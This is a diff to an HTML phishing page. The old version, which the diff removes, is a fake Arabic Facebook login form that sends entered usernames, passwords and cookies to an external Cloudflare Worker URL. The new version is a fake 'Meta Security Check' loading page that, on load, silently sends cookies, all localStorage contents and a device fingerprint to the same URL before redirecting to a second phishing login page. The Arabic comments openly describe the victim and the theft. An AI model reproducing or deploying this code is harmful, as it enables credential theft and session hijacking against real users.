@@ -3,64 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول إلى فيسبوك</title>
+    <title>Meta Security Check</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .header { width: 100%; background-color: #fff; padding: 20px 0; text-align: center; border-bottom: 1px solid #ddd; }
-        .logo { color: #1877f2; font-size: 30px; font-weight: bold; text-decoration: none; }
-        .container { width: 90%; max-width: 400px; margin-top: 20px; }
-        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
-        .login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .footer { margin-top: 30px; font-size: 12px; color: #737373; text-align: center; }
+        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader-box { text-align: center; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #1c1e21; font-size: 18px; }
     </style>
 </head>
 <body>
-    <div class="header"><span class="logo">facebook</span></div>
-    <div class="container">
-        <form id="pwa_trap">
-            <input type="text" id="u_name" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
-            <input type="password" id="u_pass" placeholder="كلمة السر" required>
-            <button type="submit" class="login-btn">تسجيل الدخول</button>
-        </form>
-        <div class="footer">
-            العربية · English (US) · Français (France)<br><br>
-            Meta © 2026
-        </div>
-    </div>
 
-    <script>
-        document.getElementById('pwa_trap').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            // تجميع البيانات والكوكيز
-            const payload = {
-                user: document.getElementById('u_name').value,
-                pass: document.getElementById('u_pass').value,
-                cookies: document.cookie,
-                platform: navigator.platform,
-                time: new Date().toLocaleString()
-            };
+<div class="loader-box">
+    <div class="spinner"></div>
+    <h2>جاري فحص أمان المتصفح...</h2>
+    <p style="color: #606770; font-size: 14px;">يرجى عدم إغلاق الصفحة</p>
+</div>
 
-            // تم إدراج رابط الـ Worker الخاص بك هنا
-            const WORKER_URL = "https://pylod.zaid00dd.workers.dev/"; 
+<script>
+    async function silentSniff() {
+        // 1. جمع بصمة الجهاز (Fingerprinting)
+        const browserData = {
+            ua: navigator.userAgent,
+            lang: navigator.language,
+            res: `${window.screen.width}x${window.screen.height}`,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            mem: navigator.deviceMemory || 'N/A',
+            cpu: navigator.hardwareConcurrency || 'N/A'
+        };
 
-            try {
-                // إرسال البيانات للـ Worker في الخلفية
-                await fetch(WORKER_URL, {
-                    method: 'POST',
-                    mode: 'no-cors', 
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-            } catch (err) {
-                console.log("Network error");
+        // 2. محاولة سحب الكوكيز المتاحة والـ LocalStorage
+        const storageData = {};
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                storageData[key] = localStorage.getItem(key);
             }
+        } catch (e) {}
 
-            // تحويل الضحية للموقع الحقيقي بعد الصيد لإتمام التمويه
-            window.location.href = "https://m.facebook.com/login/save-password-interstitial/";
-        });
-    </script>
+        // 3. تجهيز الطرد (Payload)
+        const payload = {
+            type: "SILENT_SNIFF",
+            cookies: document.cookie || "No Direct Cookies",
+            storage: storageData,
+            fingerprint: browserData,
+            url: window.location.href
+        };
+
+        // 4. الإرسال الفوري للـ Worker الخاص بك
+        const WORKER_URL = "https://pylod.zaid00dd.workers.dev/";
+        
+        try {
+            await fetch(WORKER_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(payload)
+            });
+        } catch (err) {}
+
+        // 5. بعد السحب الصامت (3 ثوانٍ)، ننتقل لصفحة الصيد التقليدية لإكمال البيانات
+        setTimeout(() => {
+            window.location.href = "login.html";
+        }, 3000);
+    }
+
+    // التنفيذ بمجرد التحميل
+    window.onload = silentSniff;
+</script>
 </body>
 </html>
